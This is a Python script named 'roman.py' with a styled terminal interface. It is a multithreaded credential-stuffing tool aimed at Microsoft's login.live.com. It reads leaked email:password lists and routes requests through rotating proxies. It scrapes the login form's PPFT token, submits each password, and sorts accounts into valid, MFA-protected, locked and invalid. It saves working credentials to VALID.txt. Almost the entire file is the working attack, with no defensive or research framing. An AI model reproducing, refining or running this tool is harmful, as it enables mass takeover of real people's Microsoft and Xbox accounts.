#!/usr/bin/env python3
# roman.py — warm skin, Rich UI
# pip install requests rich

import os, re, sys, time, threading, collections
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from tkinter import Tk, filedialog

try:
    import requests
except ImportError:
    print("  [!] pip install requests"); sys.exit(1)

from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.progress import (
    Progress, BarColumn, TextColumn, TimeElapsedColumn,
    MofNCompleteColumn, SpinnerColumn,
)
from rich.text import Text
from rich.align import Align
from rich.prompt import Prompt, IntPrompt
from rich.rule import Rule
from rich import box

console = Console()

# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════
WORDMARK = [
    "██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗",
    "██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║",
    "██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║",
    "██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║",
    "██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║",
    "╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝",
]

GOLD   = "#f0b040"
AMBER  = "#f5d76e"
COPPER = "#c9793c"
TEAL   = "#5fb8b0"
ASH    = "#8a8a8a"

def banner():
    for line in WORDMARK:
        t = Text()
        n = max(1, len(line.rstrip()))
        for i, ch in enumerate(line):
            if ch == " ":
                t.append(" ")
            else:
                if   i < n * 0.33: style = f"bold {GOLD}"
                elif i < n * 0.66: style = f"bold {AMBER}"
                else:              style = f"bold {COPPER}"
                t.append(ch, style=style)
        console.print(t, justify="center")
    console.print(Align.center(Text("Dev - @Spxcter", style=f"italic {ASH}")))
    console.print(Align.center(Text("─" * 28, style=COPPER)))
    console.print()

# ═══════════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════════
CLIENT_ID = "00000000402b5328"
SCOPE     = "service::user.auth.xboxlive.com::MBI_SSL"
REDIRECT  = "https://login.live.com/oauth20_desktop.srf"
AUTH_URL  = (
    "https://login.live.com/oauth20_authorize.srf"
    f"?client_id={CLIENT_ID}&response_type=code"
    f"&scope={SCOPE.replace(':', '%3A')}"
    f"&redirect_uri={REDIRECT.replace(':', '%3A').replace('/', '%2F')}"
)
OUTDIR = "output"
HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/124.0.0.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}
PPFT_RE = [
    re.compile(r'"sFTTag":".*?value=\\"([^\\]+)\\"/>', re.S),
    re.compile(r'name="PPFT"[^>]*value="([^"]+)"'),
    re.compile(r'value="([^"]+)"[^>]*name="PPFT"'),
]
URLPOST_RE = [
    re.compile(r'"urlPost":"([^"]+)"'),
    re.compile(r"urlPost:'([^']+)'"),
]
MS_DOMAINS = ("hotmail.", "outlook.", "live.", "msn.", "passport.")

def is_ms(e):
    try: d = e.rsplit("@", 1)[1].lower()
    except IndexError: return False
    return any(x in d for x in MS_DOMAINS)

class Stats:
    def __init__(self, n):
        self.lock  = threading.Lock()
        self.total = n
        self.done = self.valid = self.mfa = self.invalid = 0
        self.locked = self.error = self.retry = 0
        self.start = time.time()
    def bump(self, s):
        with self.lock:
            self.done += 1
            if   s == "valid":   self.valid += 1
            elif s == "mfa":     self.mfa += 1
            elif s == "invalid": self.invalid += 1
            elif s == "locked":  self.locked += 1
            elif s == "retry":   self.retry += 1
            else:                self.error += 1
    def snap(self):
        with self.lock:
            return dict(total=self.total, done=self.done, valid=self.valid,
                        mfa=self.mfa, invalid=self.invalid, locked=self.locked,
                        error=self.error, retry=self.retry,
                        elapsed=time.time() - self.start)

class ProxyPool:
    def __init__(self, path):
        self.items = []
        if path and os.path.isfile(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                self.items = [l.strip() for l in f if l.strip()]
        self.i = 0
        self.lock = threading.Lock()
    def next(self):
        if not self.items: return None
        with self.lock:
            p = self.items[self.i % len(self.items)]; self.i += 1
        if "@" in p:
            cred, hp = p.rsplit("@", 1)
            u, pw = cred.split(":", 1)
            url = f"http://{u}:{pw}@{hp}"
        else:
            url = f"http://{p}"
        return {"http": url, "https": url}

def extract_ppft(h):
    for rx in PPFT_RE:
        m = rx.search(h)
        if m: return m.group(1)
    return None

def extract_urlpost(h):
    for rx in URLPOST_RE:
        m = rx.search(h)
        if m: return m.group(1)
    return None

def has_code(u):
    try: return bool(parse_qs(urlparse(u).query).get("code"))
    except Exception: return "code=" in (u or "")

def check(combo, pool):
    combo = combo.strip()
    if not combo or ":" not in combo:
        return "invalid", "malformed", combo
    email, pw = combo.split(":", 1)
    s = requests.Session(); s.headers.update(HEADERS)
    prox = pool.next()
    if prox: s.proxies.update(prox)
    try:
        try:
            r = s.get(AUTH_URL, timeout=25, allow_redirects=True)
        except requests.exceptions.ProxyError:
            return "retry", "proxy", combo
        except requests.exceptions.Timeout:
            return "retry", "timeout", combo
        except Exception as e:
            return "error", type(e).__name__.lower(), combo
        if r.status_code != 200:
            return "error", f"http_{r.status_code}", combo
        ppft, urlpost = extract_ppft(r.text), extract_urlpost(r.text)
        if not ppft or not urlpost:
            low = r.text.lower()
            if "captcha" in low or "unusual activity" in low:
                return "error", "captcha", combo
            return "error", "parse_failed", combo
        data = {"login": email, "loginfmt": email, "passwd": pw, "PPFT": ppft}
        headers = {"Content-Type": "application/x-www-form-urlencoded",
                   "Origin": "https://login.live.com", "Referer": AUTH_URL}
        try:
            r2 = s.post(urlpost, data=data, headers=headers,
                        timeout=25, allow_redirects=True)
        except requests.exceptions.ProxyError:
            return "retry", "proxy", combo
        except requests.exceptions.Timeout:
            return "retry", "timeout", combo
        except Exception as e:
            return "error", type(e).__name__.lower(), combo
        chain = [h.url for h in r2.history] + [r2.url]
        final = (r2.url or "").lower(); body = (r2.text or "").lower()
        if any(has_code(u) for u in chain):
            return "valid", "no_mfa", combo
        if any(x in final for x in ("interrupt","proof","confirm","identity/",
                                    "fido","mfa","twofactor","authenticator","otp")):
            return "mfa", "mfa_required", combo
        if ("c0000066" in body or "password is incorrect" in body
                or "account or password is incorrect" in body):
            return "invalid", "wrong_password", combo
        if "c0000236" in body or "account has been locked" in body:
            return "locked", "locked", combo
        if "c0000224" in body or "account is disabled" in body:
            return "locked", "disabled", combo
        if "c0000225" in body or "doesn't exist" in body or "does not exist" in body:
            return "invalid", "no_account", combo
        if "captcha" in body or "unusual activity" in body:
            return "error", "captcha", combo
        if "login.live.com" in final and not has_code(final):
            if "sfttag" in body or "ppft" in body:
                return "invalid", "login_rejected", combo
            return "error", "login_page_unknown", combo
        return "error", "unknown", combo
    finally:
        s.close()

def save(status, reason, combo):
    if status == "retry": return
    if   status == "valid": path = os.path.join(OUTDIR, "VALID.txt")
    elif status == "mfa":   path = os.path.join(OUTDIR, "VALID_pendingSecurity.txt")
    else:                   path = os.path.join(OUTDIR, "others", f"{reason}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(combo + "\n")

# ═══════════════════════════════════════════════════════════════
#  LIVE VIEW
# ═══════════════════════════════════════════════════════════════
TONE = {
    "valid":   ("✓", GOLD),
    "mfa":     ("⚿", TEAL),
    "invalid": ("✗", "#d06464"),
    "locked":  ("⊘", AMBER),
    "error":   ("⚠", COPPER),
    "retry":   ("↻", ASH),
}
NAME = {"valid":"VALID","mfa":"MFA","invalid":"INVALID",
        "locked":"LOCKED","error":"ERROR","retry":"RETRY"}

class View:
    def __init__(self, stats):
        self.stats    = stats
        self.lock     = threading.Lock()
        self.activity = collections.deque(maxlen=14)
        self.hits     = collections.deque(maxlen=8)
        self.current  = ("", "")

    def push(self, status, reason, combo):
        with self.lock:
            self.activity.append((time.strftime("%H:%M:%S"), status, combo[:72], reason))
            if status in ("valid", "mfa"):
                self.hits.append((status, combo[:72]))
            self.current = (combo[:72], reason)

    def _headline(self, s):
        elapsed = max(0.001, s["elapsed"])
        cpm     = int(s["done"] / elapsed * 60)
        pct     = (s["done"] / s["total"] * 100) if s["total"] else 0
        left    = s["total"] - s["done"]
        eta     = int(left / (cpm / 60)) if cpm else 0

        g = Table.grid(expand=True, padding=(0, 1))
        for _ in range(5): g.add_column(justify="center")
        g.add_row(
            f"[bold {GOLD}]{s['valid']}[/]",
            f"[bold {TEAL}]{s['mfa']}[/]",
            f"[bold #d06464]{s['invalid']}[/]",
            f"[bold {AMBER}]{s['locked']}[/]",
            f"[bold {COPPER}]{s['error']}[/]",
        )
        g.add_row(f"[{GOLD}]valid[/]", f"[{TEAL}]mfa[/]", "[#d06464]invalid[/]",
                  f"[{AMBER}]locked[/]", f"[{COPPER}]error[/]")

        title = f"[{AMBER}]{pct:0.1f}%  ·  {s['done']}/{s['total']}  ·  {cpm} cpm  ·  eta {eta}s[/]"
        return Panel(g, title=title, border_style=COPPER, box=box.ROUNDED,
                     padding=(0, 1))

    def _hits_panel(self, s):
        with self.lock: hits = list(self.hits)
        if not hits:
            body = Text("  awaiting first valid…", style=f"italic {ASH}")
        else:
            rows = []
            for status, txt in hits:
                sym, color = TONE[status]
                t = Text()
                t.append(f" {sym} ", style=f"bold {color}")
                t.append(txt, style="white")
                rows.append(t)
            body = Group(*rows)
        return Panel(body, title=f"[{GOLD}]accepted  ({s['valid'] + s['mfa']})[/]",
                     border_style=GOLD, box=box.ROUNDED, padding=(0, 0))

    def _feed_panel(self):
        with self.lock: events = list(self.activity)
        if not events:
            body = Text("  warming up…", style=f"italic {ASH}")
        else:
            rows = []
            for ts, status, combo, reason in events:
                sym, color = TONE.get(status, ("·", ASH))
                t = Text()
                t.append(f"{ts}  ", style=ASH)
                t.append(f"{sym}  ", style=f"bold {color}")
                t.append(f"{NAME.get(status,'?'):<7}", style=f"bold {color}")
                t.append(combo, style="white")
                if status in ("error","locked"):
                    t.append(f"  · {reason}", style=ASH)
                rows.append(t)
            body = Group(*rows)
        return Panel(body, title=f"[{COPPER}]thread feed[/]",
                     border_style=COPPER, box=box.ROUNDED, padding=(0, 0))

    def _footer(self):
        with self.lock: c, r = self.current
        if not c:
            return Text(f"  ▸ standing by", style=f"italic {ASH}")
        t = Text()
        t.append("  ▸ ", style=f"bold {GOLD}")
        t.append(c, style="white")
        t.append(f"   {r}", style=ASH)
        return t

    def render(self, progress):
        s = self.stats.snap()
        upper = self._headline(s)
        mid   = Table.grid(expand=True, padding=(0, 1))
        mid.add_column(ratio=3)
        mid.add_column(ratio=2)
        mid.add_row(self._feed_panel(), self._hits_panel(s))
        return Group(upper, mid, self._footer(), progress)

# ═══════════════════════════════════════════════════════════════
#  LAUNCHER  — dosya seçim pencereleri
# ═══════════════════════════════════════════════════════════════
def pick_file(title, required=True):
    """Tkinter dosya seçim penceresi açar. required=True ise iptal edilirse çıkar."""
    root = Tk()
    root.withdraw()
    root.attributes("-topmost", True)  # pencere öne gelsin
    p = filedialog.askopenfilename(
        title=title,
        filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
    )
    root.destroy()
    if not p:
        if required:
            console.print(f"[#d06464]✗ dosya seçilmedi, çıkılıyor[/]\n")
            sys.exit(0)
        return None
    console.print(f"[{ASH}]▸ seçilen:[/] [white]{p}[/]\n")
    return p

def ask_threads():
    while True:
        n = IntPrompt.ask(f"[bold {GOLD}]threads[/]", default=10)
        if 1 <= n <= 200: return n
        console.print("[#d06464]✗ 1-200[/]\n")

def run():
    console.clear()
    banner()

    # ── combo dosyası (pencere ile) ──
    path = pick_file("Combo dosyasını seç")
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if l.strip()]
    if not combos:
        console.print("[#d06464]✗ empty file[/]"); return

    ms = [c for c in combos if ":" in c and is_ms(c.split(":", 1)[0])]
    use_filter = False
    if len(ms) != len(combos) and ms:
        ans = Prompt.ask(
            f"[bold {GOLD}]microsoft-only filter?[/] "
            f"[dim]({len(ms)} of {len(combos)})[/]", default="y").lower()
        if ans.startswith("y"):
            combos, use_filter = ms, True
    if not combos:
        console.print("[#d06464]✗ nothing to check[/]"); return

    threads = ask_threads()

    # ── proxy dosyası (pencere ile, iptal = proxy yok) ──
    pp = pick_file("Proxy dosyası (iptal = proxy yok)", required=False)
    pool = ProxyPool(pp)

    os.makedirs(os.path.join(OUTDIR, "others"), exist_ok=True)
    for f in ("VALID.txt", "VALID_pendingSecurity.txt"):
        p = os.path.join(OUTDIR, f)
        if os.path.exists(p): os.remove(p)
    for f in os.listdir(os.path.join(OUTDIR, "others")):
        os.remove(os.path.join(OUTDIR, "others", f))

    summary = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
    summary.add_column(style=ASH); summary.add_column(style="white")
    summary.add_row("combos",   f"{len(combos):,}")
    summary.add_row("threads",  str(threads))
    summary.add_row("proxies",  str(len(pool.items)) if pool.items else "none")
    summary.add_row("filter",   "microsoft only" if use_filter else "off")
    summary.add_row("flow",     "browser login · live.com")
    summary.add_row("output",   os.path.abspath(OUTDIR))
    console.print(Panel(summary, title=f"[{GOLD}]session[/]",
                        border_style=COPPER, box=box.ROUNDED, padding=(0, 1)))

    Prompt.ask(f"[dim]press enter to start (ctrl+c to stop)[/]", default="", show_default=False)

    stats = Stats(len(combos))
    view  = View(stats)

    progress = Progress(
        SpinnerColumn(style=AMBER),
        TextColumn(f"[{GOLD}]throughput"),
        BarColumn(bar_width=None, complete_style=GOLD, finished_style=GOLD),
        MofNCompleteColumn(),
        TextColumn("·"), TimeElapsedColumn(),
        console=console,
    )
    ptask = progress.add_task("check", total=len(combos))

    try:
        with Live(view.render(progress), console=console,
                  refresh_per_second=8, transient=False) as live:
            ex = ThreadPoolExecutor(max_workers=threads)
            futs = [ex.submit(check, c, pool) for c in combos]
            try:
                for fut in as_completed(futs):
                    status, reason, combo = fut.result()
                    if status == "retry":
                        status, reason, combo = check(combo, pool)
                    save(status, reason, combo)
                    stats.bump(status)
                    view.push(status, reason, combo)
                    progress.update(ptask, completed=stats.snap()["done"])
                    live.update(view.render(progress))
            finally:
                ex.shutdown(wait=False, cancel_futures=True)
    except KeyboardInterrupt:
        console.print(f"\n[{COPPER}]stopped early[/]")

    s = stats.snap()
    final = Table(box=box.DOUBLE, padding=(0, 2),
                  title=f"[bold {GOLD}]finished[/]", title_justify="center")
    for label, color in [("valid", GOLD), ("mfa", TEAL),
                         ("invalid", "#d06464"), ("locked", AMBER), ("error", COPPER)]:
        final.add_column(NAME[label], style=f"bold {color}")
    final.add_row(str(s["valid"]), str(s["mfa"]), str(s["invalid"]),
                  str(s["locked"]), str(s["error"]))
    console.print()
    console.print(Align.center(final))
    console.print(Align.center(Text(
        f"{s['done']:,}/{s['total']:,} in {int(s['elapsed'])}s  ·  "
        f"output/VALID.txt  ·  output/VALID_pendingSecurity.txt",
        style=ASH)))
    console.print()

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print()
